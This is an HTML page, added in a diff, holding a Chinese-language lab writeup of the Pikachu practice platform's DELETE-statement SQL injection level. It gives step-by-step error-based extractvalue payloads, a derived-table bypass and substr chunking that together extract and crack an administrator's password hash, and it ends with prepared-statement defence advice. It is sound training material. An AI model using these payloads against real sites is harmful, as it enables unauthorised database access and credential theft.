@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-SQL-Inject "delete"注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-SQL-Inject "delete"注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.28 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, SQL注入, delete注入, 报错注入, extractvalue, 派生表, 32字符限制</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - SQL-Inject</li>
+        <li><strong>题目名称：</strong>"delete"注入</li>
+        <li><strong>目标：</strong>利用数据删除（DELETE）场景下的 SQL 注入漏洞，结合报错注入与派生表技术，突破 32 字符回显限制与同表更新限制，获取数据库中的管理员账号和密码。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>该关卡模拟了留言板的删除功能。后端代码未对用户输入进行过滤，直接将数据拼接到 <code>DELETE FROM message WHERE id = $id</code> 语句中执行。由于是 DELETE 操作，页面不仅没有数据查询回显，而且具有破坏性。因此，攻击者不能依赖 SELECT 回显，必须使用 <strong>报错注入（Error-based Injection）</strong> 配合 <strong>布尔逻辑测试</strong>。在无回显的 INSERT/DELETE 场景下，利用 <code>extractvalue()</code> 函数故意制造 XPath 语法错误，将查询结果通过报错信息带出。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型与心路历程：</strong>
+        <ul>
+            <li><strong>F12抓包与URL注入：</strong>通过F12抓包明确请求方式为GET，参数名为 <code>id</code>。直接在浏览器地址栏手工构造URL进行注入测试。</li>
+            <li><strong>无损探测技巧：</strong>在测试 <code>and 1=1</code> 和 <code>and 1=2</code> 时，发现真实的留言被误删。为了安全测试，后续采用不存在的 <code>id=999</code> 作为注入入口，在触发报错注入的同时避免删除真实数据。</li>
+            <li><strong>MySQL 同表更新限制：</strong>在 DELETE <code>member</code> 表的同时，尝试 SELECT 该表的数据会触发 <code>You can't specify target table 'member' for update in FROM clause</code> 错误。解决方案是使用<strong>派生表（Derived Table）</strong>绕过。</li>
+            <li><strong>32字符回显限制：</strong><code>extractvalue</code> 报错回显最多 32 个字符。MD5 哈希恰好占满 32 位，加上波浪号后超长被截断。采用 <code>substr()</code> 函数分段提取，成功获取完整哈希。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：抓包与参数分析</h3>
+        <p class="info-line"><span class="info-label">操作：</span>在页面新增一条留言，点击“删除”，按 F12 抓取请求。</p>
+        <p class="info-line"><span class="info-label">分析结果：</span>请求 URL 为 <code>/pikachu/vul/sqli/sqli_del.php?id=57</code>。确认请求方式为 GET，参数名为 <code>id</code>。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：漏洞探测（布尔逻辑测试）</h3>
+        <p class="info-line"><span class="info-label">操作 1：</span> 测试真条件 <code>id=57 and 1=1</code>。</p>
+        <div class="payload-box">
+            <p><strong>回显：</strong> 页面提示“删除失败,检查下数据库是不是挂了”。（说明真实存在的留言被删掉了，且页面不显示 SQL 报错）。</p>
+        </div>
+        <p class="info-line"><span class="info-label">操作 2：</span> 为避免误删，采用不存在的 ID 进行测试：<code>id=999 and 1=1</code> 和 <code>id=999 and 1=2</code>，均返回“删除失败”，页面无 SQL 报错信息。</p>
+        <p class="info-line"><span class="info-label">说明：</span>证明 <code>id</code> 参数存在注入点，但由于报错被屏蔽，需改用报错注入强制带出数据。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：报错注入获取库名</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 使用不存在的 <code>id=999</code> 配合 <code>extractvalue</code> 报错注入。</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?id=999 and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span> 页面成功报错并回显 <code>XPATH syntax error: '~pikachu~'</code>，数据库名为 <code>pikachu</code>。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：提取密码的失败过程与限制分析</h3>
+        <p class="info-line"><span class="info-label">操作 1（32字符限制）：</span> 尝试直接提取 <code>member</code> 表的 <code>pw</code> 字段。</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?id=999 and extractvalue(1,concat(0x7e,(select pw from member limit 0,1),0x7e))</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">结果：</span> 报错信息被截断。MD5 长度为 32 位，加上波浪号总长度超过 32 字符，MySQL 报错回显有 <strong>32 字符的硬性限制</strong>，导致正则匹配不到完整数据。</p>
+
+        <p class="info-line"><span class="info-label">操作 2（同表更新限制）：</span> 尝试使用 <code>substr</code> 分段提取。</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?id=999 and extractvalue(1,concat(0x7e,substr((select pw from member limit 0,1),1,16),0x7e))</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">结果：</span> 报错 <code>You can't specify target table 'member' for update in FROM clause</code>。MySQL 不允许在 DELETE 表 A 时，子查询直接 SELECT 表 A。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第五步：绕过与提取（派生表 + 分段提取）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 利用 <strong>派生表（Derived Table）</strong> 技巧，将 <code>member</code> 表包在 <code>as t</code> 中，欺骗 MySQL 将其视为临时结果集。</p>
+        
+        <p class="info-line"><span class="info-label">1. 提取密码前 16 位：</span></p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?id=999 and extractvalue(1,concat(0x7e,substr((select pw from (select pw from member limit 0,1) as t),1,16),0x7e))</code></p>
+            <p><strong>回显：</strong> <code>XPATH syntax error: '~e10adc3949ba59ab~'</code></p>
+        </div>
+
+        <p class="info-line"><span class="info-label">2. 提取密码后 16 位：</span></p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?id=999 and extractvalue(1,concat(0x7e,substr((select pw from (select pw from member limit 0,1) as t),17,16),0x7e))</code></p>
+            <p><strong>回显：</strong> <code>XPATH syntax error: '~be56e057f20f883e~'</code></p>
+        </div>
+        
+        <p class="info-line"><span class="info-label">3. 拼装与解密：</span> 将两次结果拼接得到完整的 32 位 MD5 哈希：<code>e10adc3949ba59abbe56e057f20f883e</code>。放入 cmd5.com 进行查询，解密得到明文密码为 <code>123456</code>。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：DELETE 注入的破坏性导致真实数据被误删。</strong> 测试 <code>1=1</code> 时会触发真实删除。解决方案是使用不存在的 <code>id=999</code> 作为注入载体，仅触发报错而不影响真实数据。</li>
+        <li><strong>坑2：MySQL 报错注入的 32 字符硬性限制。</strong> <code>extractvalue</code> 回显最多 32 字符，MD5 哈希加上波浪号超长被截断。解决方案是使用 <code>substr()</code> 函数分段提取，再拼接。</li>
+        <li><strong>坑3：同表更新限制。</strong> 使用 <code>substr</code> 配合子查询时，MySQL 禁止在 DELETE 表 A 时，子查询直接 SELECT 表 A。解决方案是使用派生表：<code>select pw from (select pw from member limit 0,1) as t</code>。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>DELETE 注入核心：</strong> 攻击点位于数据删除语句中。需通过布尔逻辑或报错注入进行探测，并特别注意其破坏性，采用无损注入策略。</li>
+        <li><strong>报错注入（Error-based Injection）：</strong> 利用数据库函数（如 <code>extractvalue</code>、<code>updatexml</code>）强制报错，将查询结果拼接在错误信息中返回。适用于无回显的 INSERT/UPDATE/DELETE 场景。</li>
+        <li><strong>防御建议：</strong> 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；对用户输入进行严格的过滤和转义。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
